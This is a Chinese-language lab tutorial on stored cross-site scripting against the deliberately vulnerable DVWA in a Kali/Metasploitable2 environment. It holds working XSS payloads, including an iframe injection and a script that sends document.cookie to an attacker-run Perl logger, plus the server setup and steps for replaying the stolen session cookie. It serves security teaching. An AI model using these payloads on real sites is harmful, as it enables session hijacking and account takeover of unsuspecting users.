# 存储型跨站脚本（XSS）攻击

## 1. 课程说明

本课程为动手实验教程，为了能说清楚实验中的一些操作会加入理论内容，也会精选最值得读的文章推荐给你，在动手实践的同时扎实理论基础。

**注意：实验用的云主机因为配置成本较高，会限制次数，每个实验不超过6次**

## 2. 学习方法

实验楼的 Kali 系列课程包含五个训练营，本训练营主要讲述 Web 应用攻击方法。课程包含20个实验，每个实验都提供详细的步骤和截图。适用于有一定 Linux 系统基础，想快速上手 Kali 渗透测试的同学。

学习方法是多实践，多提问。启动实验后按照实验步骤逐步操作，同时理解每一步的详细内容。

如果实验开始部分有推荐阅读的材料，请务必先阅读后再继续实验，理论知识是实践必要的基础。

## 3. 本节内容简介

本实验中我们初步接触 Kali Linux 和渗透测试的概念。需要依次完成下面几项任务：

- 存储型 XSS 简介
- 存储型 XSS 的简单实验
- 存储型 XSS 的中间人攻击

## 4. 推荐阅读

本节实验推荐阅读下述内容：

1. [Owasp 文档](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)


## 5. 存储型 XSS

### 5.1 存储型 XSS 简介

在上一节试验中我们了解到什么是反射型 XSS 攻击，并且了解到 XSS 攻击的具体实现方式。

我们知道反射型 XSS 又称为非持久型 XSS，这是因为它只是一次 GET 变量上做手脚，其他的用户访问该页面没有任何影响，只有访问特殊 URL 的时候会被攻击。

而与反射型 XSS （Reflected xss）相反的攻击方式便称为持久型 xss，又可以称作存储型 XSS（Stored XSS），持久的意思是这种方式的 javascript 注入并修改到服务器上，其他用户访问该页面也会收到影响，在 URL 上并没有什么特殊的变化。

也就是通过漏洞修改了服务器上相应的代码，任何用户访问该页面都会去执行一些特殊的命令，从而获取我们所需要的信息。

### 5.2 XSS 攻击方式的区别

我们通过这样的表格来了解两种 XSS 攻击方式的区别：

| 项目\方式 | 反射型                              | 存储型                                |
| --------- | ----------------------------------- | ------------------------------------- |
| URL       | 在 URL 上有变量的体现               | URL 上没有任何的变化                  |
| 提交方式  | GET 方式                            | POST 方式                             |
| 代码修改  | 没有修改，访问正常的 URL 不会有影响 | 修改了代码，访问正常的 URL 也会有影响 |
| 影响范围  | 个别人群（访问错误 URL 的人群）     | 所有人群                              |

由此我们便可简单明了的知道他们直接的区别在哪里。

### 5.3 环境的启动

从上一节中我们知道系统我们提供了一个靶机系统，系统中提供了 DVWA、Mutillidae 的攻击平台，使用这样的攻击平台能让我们更快的了解这些攻击的原理。

本章节我们将继续使用 DVWA 来学习存储型 XSS 的相关知识点，学习之前我们将启动我们的环境：

在实验桌面中，双击 Xfce 终端，打开终端：

![此处输入图片的描述](https://doc.shiyanlou.com/document-uid13labid2290timestamp1479374588595.png/wm)

使用 `sudo virsh start Metasploitable2` 命令即可启动我们的靶机系统虚拟机：

![start-metasploit.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139532596.png/wm)

稍等片刻，待得虚拟机完全启动之后我们打开桌面上的 Firefox：

![open-firefox.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139552463.png/wm)

访问我们的靶机系统所使用的 IP 地址`192.168.122.102`：

![view-metasploit-url.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139568548.png/wm)

正常的启动靶机系统之后，我们访问其 IP 地址可以得到这样的一个页面。

点击 DVMA 我们便可进入到 DVMA 的登陆页面，默认的登陆用户与密码是 admin 与 password，登陆之后便会进入这样的页面：

![dvwa-index.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139587112.png/wm)

为了能够进行最简单的攻击，我们会把安全默认调制最低，首先进入安全模式的调整页面：

![dvwa-config-security.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139662479.png/wm)

然后调整安全的 level 到 low：

![dvwa-config-security-1.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139678741.png/wm)

当看到页面的下方 Level 的显示变化后，说明修改成功了：

![dvwa-config-security-proof.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139693059.png/wm)

## 6. 存储型 XSS 初试

做好一切的准备工作之后我们开始我们的存储型 XSS 的学习。

点击页面中的 `XSS stored` 即可进入到 DVWA 为我们提供攻击平台：

![show-stored-xss](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230497689.png/wm)

我们可以看到 DVWA 为我们提供了一个类似于留言板的功能。

又是有两个两个文本框，并且还可以提交。

首先我们来测试一下，文本框是否有一些限制：

![show-limit-black](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230518610.png/wm)

可以看到标题栏与文本栏都有字数上的显示，然后我们试着发布一下：

![show-test-post](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230533464.png/wm)

我们看到 URL 并没有变化，刚刚发布的信息马上就在下方显示出来，由此我们可以猜想他是通过 POST 的方式提交表单的内容，然后下方的数据显示是通过在数据库中的读取而显示出来。

我们尝试在留言板中输入反射型 XSS 中所注入过的 javascript 代码；

```js
<script>alert("nihao,shiyanlou")</script> 
```

![stored-xss-test](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230550563.png/wm)

点击 `Sign Guestbook` 提交内容之后我们发现，有弹窗出现：

![stored-xss-test-result.png](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230563872.png/wm)

说明该 Web 应用同样没有对内容进行过滤，我们可以通过这样的方式执行我们的 javascript 代码。

并且我们点击确定之后退出重新访问该页面还会有同样的弹窗出现，并且此时我们并没有使用特殊的 URL 来访问。

这就是存储型 XSS 与反射型 XSS 之间的区别，这就像：

我们从公司回家，有一个人在你回家的小路上挖了一个坑，然后用一个指示牌去诱导你走小路，等着你往坑里跳，这就是反射型 XSS，它影响的范围较小，不喜欢冒险，不走小路的人就不会进坑。

而我们从公司回家，有一个人在你回家的必经之路上挖了一个坑，这个时候不需要诱导你，因为你必然会走到坑里面去，这就是存储型 XSS。

我们查看源代码：

![stored-xss-low-source](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230582607.png/wm)

从源代码中我们可以了解到：

- 首先获取到 mtxMessage 与 txtName 两个变量，在获取到之后：
  + 先使用 trim() 函数将字串首尾两端的空格移除，这样可以节约数据库的空间。
  + 然后使用 stripslashes() 函数来删除获取数据中的反斜杠
  + 接着使用 mysql_real_escape_string() 函数来转义 SQL 语句中使用的字符串中的特殊字符，这样可以方式 SQL 注入
- 对于数据的处理完毕之后，便将其插入到数据库中；

整个过程中并没有对插入的数据有任何的 javascript 方面的过滤，这样使得我们的评论中的 script 标签能够正常的插入到数据库中，既然是评论那么可能会展示出来，在展示的时候读取到我的评论就会识别到 script 标签，就会将其解析，然后执行，所以这样导致只要读取了我发表的那个评论就会执行那段代码，这样所有人访问这个页面都会 “中招”。

通过 F12 查看页面的内容，我们可以看到;

![stored-xss-low-source-comment](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230610783.png/wm)

这就是存储型 XSS，相对来说比反射型 XSS 的价值更大。

你会说就一个弹窗没有什么用，那如果我们把插入的代码换成：

```
<script>alert(document.cookie)</script>
```

![stored-xss-cookie-result.png](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230634238.png/wm)

这里还是一个弹窗，但是我把这里的 alert() 操作替换成我自己服务器上的一个 php 脚本，通过这个脚本来获取 cookie，这样价值就非常大了，可以利用这些 cookie ID 来完成中间人攻击，有时候甚至会因为程序员的不注意，让我们在获取 cookie ID 的时候甚至能够看到管理员的用户名与密码，若是这样的情况的话，价值就不言而喻了。

## 7.存储型 XSS 的 IFRAME 攻击

上述的攻击方式较为基础简单，还有一种嵌入 iframe 的方式曾经也被广为流传。

在 HTML 中的 dev 被广泛使用之前 iframe 的隔离，使得看似一个页面访问了多个其他页面的方式被大家所认可，几乎大多数的网站都是用了它。

而这样的方式让我们有了可趁之机，我们可以使用 iframe 放在在原网页上，让后来的用户直接访问我们的钓鱼网站上，这样增大了我们攻击用户主机的成功率。

为了不让之前的实验结果影响到我们，我们首先重置一下数据库，在 setup 标签中重置：

![reset-db](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230652147.png/wm)

当我们再次返回 xss stored 页面的时候我们便可看到刚刚的评论已经清除：

![reset-db-result.png](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230662475.png/wm)

然后我们在输入框中输入：

```
Name: shiyanlou4

Message: <iframe src="http://localhost"></iframe>
```
![stored-xss-iframe-test](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230675386.png/wm)
接着我们可以看到这样的效果：

![stored-xss-iframe-result](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230687213.png/wm)

## 8.存储型 XSS 的 MITM 攻击

上一节中我们提到了中间人攻击，虽然反射型 XSS 也能实现 MITM，但是相对来说存储型 XSS 能够悄然无息的获得更多用户的 cookie，能够将利益最大化。

要做到中间人攻击我们必须具备两个条件：

- 被攻击人的 cookie 值
- 切换本地的 cookie 值

而要做到这两点我们需要这两个条件：

- 一个自动接收远端发来 cookie 的脚本
- 一个 Firefox 切换 cookie 的插件工具


在实验楼桌面上的终端中下载我们已经准备好的 perl 的接收 cookie 脚本：

```
wget http://labfile.oss.aliyuncs.com/courses/717/logit.pl.TXT
```

使用 scp 命令拷贝到 kali 上：

```
scp logit.pl.TXT roo@kali:~/
```

我们通过桌面的终端登陆到 kali 的虚拟机上

![login-kali](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230709593.png/wm)

然后我们将其放置 `/usr/lib/cgi-bin` 中，同时将其 `.TXT` 的后缀去掉：

```
 mv logit.pl.TXT /usr/lib/cgi-bin/logit.pl
```

![mv-logit.pl](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230849077.png/wm)

与此同时修改该文件的所属者、给予其执行的权限：

```
chown www-data:www-data logit.pl
chmod 700 logit.pl
```

![chmod-logit](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230860739.png/wm)

此时我们便配置好了接收的脚本，然后我们开始修改 apache 相关的配置文件：

```
vim /etc/apache2/apache2.conf
```

![vim-config](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230874868.png/wm)

进入 vim 的界面后，通过 `/Di` 我们找到配置文件访问权限的位置，按 `i` 进入插入模式：

![search-config (2).png](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1483079679768.png/wm)

我们需要再次插入刚刚我们存放脚本的 `/usr/lib/cgi-bin` 目录的访问权限，再次添加这样一些内容：

```
ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
<Directory "/usr/lib/cgi-bin">
  Options +ExecCGI
  AddHandler cgi-script .cgi .pl
  Options FollowSymLinks
  Require all granted
</Directory>
```

![config-apache](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230897073.png/wm)

添加完之后，按 `Esc` 然后输入 `:wq` 来保存配置。

接着我们需要在 `/var/www/` 目录下创建一个 logdir 目录，并修改他们的权限，该目录用于存放我们获取到的 cookie 值。

```
mkdir -p /var/www/logdir
chown www-data:www-data /var/www/logdir
chmod 700 /var/www/logdir
```

![mkdir-log](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230907228.png/wm)

接着我们需要使用 `a2enmod cgi` 来启动 apache2 的 cgi 模块。

配置完成后，我们便可通过 `service apache2 start`启动 apache

![start-cgi-apache2](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230972896.png/wm)

成功启动之后，我们可以使用 Firefox 浏览器来访问 `http://192.168.122.101/cgi-bin/logit.pl` 来验证我们是否正确配置了：

![proof-config](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230982503.png/wm)

若是访问的时候出现了 404 说明刚刚我们在 apache2.conf 配置文件中添加该目录的访问配置没有成功。

若是访问的时候出现了 403 说明刚刚在配置目录权限时 `Require all granted` 没有生效。

如此我们便完成了第一步，能够接收 cookie，接着为了能够切换 cookie 我们需要在 Firefox 上安装 cookie_manager 的插件。

我们通过这样的命令在终端中下载该插件的安装包（注意在 shiyanlou 终端中下载，别在 kali 虚拟机中下载）：

```
wget http://labfile.oss.aliyuncs.com/courses/717/cookies_manager-1.14.3-fx.xpi	
```

![download-xpi](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230993485.png/wm)

然后我们在 Firefox 中安装该插件：

找到 Firefox 的设置

![install-xpi-1](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231016543.png/wm)

然后添加本地的插件安装包：

![install-xpi-2.png](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231034254.png/wm)
找到刚刚我们下载的安装文件：

![install-xpi-3.png](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231042871.png/wm)

选择安装该插件：

![install-xpi-4.png](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231050757.png/wm)

安装成功之后会提示我们重启浏览器，重启便是，由此我们便做好了所有的准备工作。

然后我们再次进入 DVWA 为我们提供的 xss stored 环境中，上文我们提到过输入框对字数有所限制，但是对我们而言是不够的，我们需要修改一下，按 F12 打开调试工具，选择查看器，通过选择器选择我们的文本框，看到文本框相关的 HTML 代码，将 50 的限制修改到 200：

![config-html](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231061803.png/wm)

然后我们输入这样的信息：

```
<SCRIPT>document.location='http://192.168.122.101/cgi-bin/logit.pl?'+document.cookie</SCRIPT>
```

![insert-script](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231072162.png/wm)

然后我们点击提交，我们会看到页面跳转到了我们接收 cookie 的地方：

![show-cookie](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231085159.png/wm)

然后我们关闭浏览器，重新打开 Firefox。

安装 alt 键，选择工具，选择我们刚刚安装的插件 cookie_manager:

![open-manager](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231103410.png/wm)

再次打开我们的 cookie_manager 会发现我们的 cookie 信息是空的，此时我们再打开 `http://192.168.122.102/dvwa` 发现会让我们登陆：

![reopen-dvwa](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231123037.png/wm)

此时我们再开 cookies_manager 会有两条 cookie 信息，我们清除该信息：

![delet-cookie](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231140321.png/wm)

然后添加我们刚刚的 cookie 信息，你可能会说刚刚忘了保存页面上的 cookie 信息了，没事我们的 logit.pl 脚本已经将获得的信息保存在了 `/var/www/logdir` 中了：

![view-log](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231154426.png/wm)

通过 `less log.txt` 我们可以看到刚刚的 cookie 信息：

![show-log-cookie](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231165330.png/wm)

然后导入我们的刚刚备份的内容：

![creat-cookie-session](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231174636.png/wm)

![creat-cookie-security](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231189331.png/wm)

获取到多少就需要录入多少，若是实在不清楚路径，可以在清除之间查看每个值所对应的路径。

此时我们在 URL 栏中输入 `http://192.168.122.102/dvwa/index.php` 我们会发现，我们居然不用登陆进入到了首页，并且我们通过 Security Level 是 low 可以看出是我们刚刚登陆的用户。

![proof-mi](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231198368.png/wm)

这就是中间人攻击，在不用输入用户名、密码的情况下悄悄的登陆，本实验中跳转到获取信息的页面是为了展示，真正在攻击的时候不会跳转，要在不知不觉中偷走你的 cookie 信息。

## 9. 总结

本节实验中我们学习了以下内容，任何不清楚的地方欢迎到[实验楼问答](https://www.shiyanlou.com/questions)与我们交流：

1. 存储型 XSS 简介
2. 存储型 XSS 的简单实验
3. 存储型 XSS 的中间人攻击

请务必保证自己能够动手完成整个实验，只看文字很简单，真正操作的时候会遇到各种各样的问题，解决问题的过程才是收获的过程。

## 10. 作业

1.若是认为上述实验并不够明显我们可以使用其他用户登陆，再做一次

```
用户名：gordonb
密码：abc123
```

2.若是觉得还是不够明显，我们可以使用 Mutillidae 来实现一次。

Mutillidae 的环境有点问题，是使用之前我们需要修改一下配置文件：

首先使用 `ssh msfadmin@target` 登陆靶机系统（注意使用 shiyanlou 用户所在终端登陆）：

![homework-ssh](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231211681.png/wm)

紧接着修改 Mutillidae 的连接数据库配置文件：

```
vim /var/www/mutillidae/config.inc
```

将文本中的 `$dbname = 'metasploit';` 修改为 `$dbname = 'owasp10';` 

![homework-config.png](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231222076.png/wm)

如此我们就可以进入 Mutillidae 中注册账户，然后登陆账户：

![homework-registry.png](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231232097.png/wm)

我们可以在 Mutillidae 为我们提供的环境中做类似的实验：

![homework-env.png](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231242102.png/wm)

若是能够做到重新打开浏览器、录入 cookie 信息，访问页面看到登陆的用户与关闭之前的相同表示成功。

3.以上个实验的方法查看是如何防范存储型 XSS。(若是看不懂其中的代码，可以参考[这篇文章](http://yttitan.blog.51cto.com/70821/1730072))